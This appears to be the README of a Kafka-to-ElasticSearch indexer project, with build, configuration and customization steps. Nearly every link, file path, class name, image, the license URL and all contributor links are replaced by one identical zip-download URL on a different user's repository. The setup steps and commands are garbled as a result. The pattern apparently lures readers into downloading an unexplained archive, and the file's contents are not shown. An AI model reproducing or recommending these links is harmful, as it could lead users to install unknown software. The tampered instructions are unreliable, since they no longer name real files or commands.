[![Build Status](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
[ ![Download](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip) ](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)

# Welcome to the kafka-elasticsearch-standalone-consumer wiki!

## Architecture of the kafka-elasticsearch-standalone-consumer [indexer]

![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)


# Introduction

### **Kafka Standalone Consumer [Indexer] will read messages from Kafka, in batches, process and bulk-index them into ElasticSearch.**


# How to use ? 

### Running via Gradle 

1. Download the code into a `$INDEXER_HOME` dir.

2. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - update all relevant properties as explained in the comments.

3. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - specify directory you want to store logs in: `<property name="LOG_DIR" value="/tmp"/>`. Adjust values of max sizes and number of log files as needed.

4. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - consumer start options can be configured here (Start from earliest, latest, etc), more details inside a file.

5. modify `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip if needed

	If you want to use custom IMessageHandler class - specify it in the following config:
	(make sure to only modify the class name, not the beans' name/scope)
	
	`<bean id="messageHandler"
          class="https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip"
          scope="prototype"/>`

6. build the app:

    `cd $INDEXER_HOME`

    `./gradlew clean jar`

    The **https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip** will be created in the `$INDEXER_HOME/build/libs/` dir.

7. make sure your `$JAVA_HOME` env variable is set (use JDK1.8 or above);
	you may want to adjust JVM options and other values in the `gradlew` script and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` file

8. run the app:

	`./gradlew run https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
 
### Running via generated scripts:

* Steps 1 - 6 are the same
* run: `./gradlew clean installDist`

* `cd ./build/install/kafka-elasticsearch-consumer/bin` dir:
![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)

* run `./kafka-elasticsearch-consumer https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` script

# Versions

* Kafka Version: 1.0.x

* ElasticSearch: 5.5.x

* JDK 1.8

# Configuration

Indexer application properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
You can specify you own properties file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`

Logging properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
You can specify your own logback config file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` property

Indexer application Spring configuration is specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip
[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)

Consumer start options configuration file is specified in https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - by default `RESTART` option is used for all partitions:
[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
You can specify you own configuration file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`

# Customization

Indexer application can be easily customized. The main areas for customizations are: 
* message handling/conversion
	examples of use cases for this customization:
	- your incoming messages are not in a JSON format compatible with the expected ES message formats
	- your messages have to be enreached with data from other sources (via other meta-data lookups, etc.)
	- you want to selectively index messages into ES based on some custom criteria
* index name/type customization

## ES message handling customization 
Message handling can be customized by implementing the IMessageHandler interface :

* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` is an interface that defines main methods for reading events from Kafka, processing them, and bulk-intexing into ElasticSearch. One can implement all or some of the methods if custom behavior is needed. You can customize:
* `transformMessage(...)` method to transform an event from one format into another;
* `addEventToBatch(...)` method - adding an event to specified (or custom ) index, with or without routing info
* `postToElasticSearch(...)` method - most likely you won't need to customize this

To do this customization, you can implement the IMessageHandler interface and inject the `ElasticSearchBatchService` into your implementation class and delegate most of the methods to the ElasticSearchBatchService class. ElasticSearchBatchService gives you basic batching operations.

See `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` for an example of such customization. 

* _**Don't forget to specify your custom message handler class in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. By default, SimpleMessageHandlerImpl will be used**_

## ES index name/type management customization 
Index name and index type management/determination customization can be done by providing custom logic in your implementation of the IMessageHandler interface:

* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` uses `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` values as configured in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. If you want to use custom logic - add it to the `addEventToBatch(...)` method

# Running as a Docker Container

TODO

# License

kafka-elasticsearch-standalone-consumer

	Licensed under the Apache License, Version 2.0 (the "License"); you may
	not use this file except in compliance with the License. You may obtain
	a copy of the License at

	     https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip

	Unless required by applicable law or agreed to in writing,
	software distributed under the License is distributed on an
	"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
	KIND, either express or implied.  See the License for the
	specific language governing permissions and limitations
	under the License.

# Contributors

 - [Krishna Raj](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 - [Marina Popova](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 - [Dhyan Muralidharan](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 - [Andriy Pyshchyk](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 - [Vitalii Chernyak](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
